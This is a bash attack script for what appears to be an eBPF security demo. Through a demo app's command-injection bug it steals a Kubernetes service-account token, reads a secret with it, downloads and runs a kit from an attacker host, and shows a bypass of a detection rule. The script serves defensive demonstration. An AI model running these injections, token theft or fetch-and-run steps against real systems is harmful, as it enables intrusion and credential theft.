#!/usr/bin/env bash
# The attacker's side of the demo, through the app's command-injection bug.
set -euo pipefail
cd "$(dirname "$0")/.."
export KUBECONFIG=${KUBECONFIG:-/etc/rancher/k3s/k3s.yaml}

PORT=${PORT:-5000}
BASE="http://localhost:$PORT"
INVENTORY="http://inventory.demo.svc.cluster.local:8080"
TOKEN_PATH=/var/run/secrets/kubernetes.io/serviceaccount/token

ensure_port_forward() {
  curl -s --max-time 2 "$BASE/" >/dev/null 2>&1 && return 0
  pkill -f "kubectl.*port-forward.*svc/webapp" 2>/dev/null || true
  sleep 1
  kubectl -n demo port-forward svc/webapp "$PORT:5000" >/tmp/ebpf-demo-port-forward.log 2>&1 &
  for _ in $(seq 1 30); do
    curl -s --max-time 1 "$BASE/" >/dev/null 2>&1 && return 0
    sleep 0.5
  done
  echo "Could not reach the app through port-forward; see /tmp/ebpf-demo-port-forward.log" >&2
  exit 1
}

attacker_ip() {
  podman inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ebpf-attacker
}

shorten_tokens() {
  if [ "${SHOW_FULL_TOKEN:-0}" = 1 ]; then cat; else
    sed -E 's/(eyJ[A-Za-z0-9_-]{24})[A-Za-z0-9._-]{40,}/\1...[token shortened]/g'
  fi
}

inject() {
  printf '\033[36m$ %s\033[0m\n' "$1"
  curl -sG --max-time 20 --data-urlencode "host=localhost; $1" "$BASE/lookup" \
    | grep -vE '^(::1|127\.0\.0\.1)[[:space:]]' | shorten_tokens || true
  echo
}

banner() { printf '\n\033[1;31m### %s\033[0m\n' "$*"; }

recon() {
  banner "1. Recon"
  inject 'id; hostname; uname -r'
}

token() {
  banner "2. Steal the service-account token"
  # shellcheck disable=SC2016
  inject "cat $TOKEN_PATH; rc=\$?; echo; echo \"cat_exit=\$rc\""
}

use_token() {
  banner "3. Use the stolen token from outside the cluster"
  local tok server ca
  tok=$(curl -sG --max-time 20 --data-urlencode "host=localhost; cat $TOKEN_PATH" "$BASE/lookup" \
        | grep -oE 'eyJ[A-Za-z0-9._-]+' | head -1 || true)
  if [ -z "$tok" ]; then
    echo "No token captured (blocked?). Nothing to use."
    return 0
  fi
  server=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
  ca=$(mktemp)
  kubectl config view --minify --raw -o jsonpath='{.clusters[0].cluster.certificate-authority-data}' | base64 -d > "$ca"
  printf '\033[36m$ kubectl --token=<stolen> -n demo get secret payments-api-key\033[0m\n'
  kubectl --kubeconfig=/dev/null --server="$server" --certificate-authority="$ca" \
    --token="$tok" -n demo get secret payments-api-key \
    -o jsonpath='{.data.api-key}' | base64 -d; echo
  rm -f "$ca"
}

download() {
  banner "4. Download and run the attacker's kit"
  local ip; ip=$(attacker_ip)
  inject "rm -f /tmp/kit.sh; curl -s http://$ip/kit.sh -o /tmp/kit.sh; echo curl_exit=\$?; sh /tmp/kit.sh"
}

legit() {
  banner "Legitimate app traffic (must keep working)"
  printf '\033[36m$ curl %s/status\033[0m\n' "$BASE"
  curl -s --max-time 10 "$BASE/status"
}

bypass() {
  banner "Limit: matchCmdArgs only checks the argument at a fixed index"
  local ip; ip=$(attacker_ip)
  inject "curl $INVENTORY/health -s http://$ip/kit.sh; echo curl_exit=\$?"
}

tripwire() {
  banner "Tripwire: read the decoy credentials, then download with python"
  local ip; ip=$(attacker_ip)
  inject 'cat /app/.aws/credentials'
  inject "python3 -c \"import urllib.request;print(urllib.request.urlopen('http://$ip/kit.sh',timeout=5).read().decode())\"; echo exit=\$?"
}

ensure_port_forward
case "${1:-all}" in
  recon) recon ;;
  token) token ;;
  use-token) use_token ;;
  download) download ;;
  legit) legit ;;
  bypass) bypass ;;
  tripwire) tripwire ;;
  all) recon; token; use_token; download ;;
  *) cat >&2 <<'EOF'
usage: scripts/attack.sh <recon|token|use-token|download|legit|bypass|tripwire|all>
  all  recon, token, use-token, download (the default)
Set SHOW_FULL_TOKEN=1 to print the stolen token in full.
EOF
     exit 1 ;;
esac
